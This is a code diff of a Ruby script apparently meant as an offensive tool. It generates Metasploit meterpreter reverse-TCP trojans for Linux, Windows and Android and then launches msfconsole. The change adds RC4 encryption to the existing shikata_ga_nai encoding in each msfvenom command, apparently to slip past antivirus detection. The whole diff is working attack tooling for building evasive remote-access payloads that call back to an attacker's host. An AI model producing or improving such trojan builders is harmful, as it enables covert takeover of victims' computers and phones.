@@ -27,17 +27,17 @@ fileName = nil
 case selection
 when "LINUX"
   fileName = "trojan.elf"
-  IO.popen "msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=#{ip} -e x86/shikata_ga_nai -i 5 -f elf -o #{fileName}" do |io|
+  IO.popen "msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=#{ip} --encrypt rc4 --encrypt-key password -e x86/shikata_ga_nai -i 5 -f elf -o #{fileName}" do |io|
     puts io.gets
   end
 when "WINDOWS"
   fileName = "trojan.exe"
-  IO.popen "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=#{ip} -e x86/shikata_ga_nai -i 5 -f exe -o #{fileName}" do |io|
+  IO.popen "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=#{ip} --encrypt rc4 --encrypt-key password -e x86/shikata_ga_nai -i 5 -f exe -o #{fileName}" do |io|
     puts io.gets
   end
 when "ANDROID"
   fileName = "trojan.apk"
-  IO.popen "msfvenom -p android/meterpreter/reverse_tcp LHOST=#{ip} -e x86/shikata_ga_nai -i 5 -f raw -o #{fileName}" do |io|
+  IO.popen "msfvenom -p android/meterpreter/reverse_tcp LHOST=#{ip} --encrypt rc4 --encrypt-key password -e x86/shikata_ga_nai -i 5 -f raw -o #{fileName}" do |io|
     puts io.gets
   end
 else
@@ -66,4 +66,3 @@ file.close
 
 # run MSFCONSOlE with the created file as an argument
 exec("msfconsole -r #{Dir.pwd}/commands.rc")
-
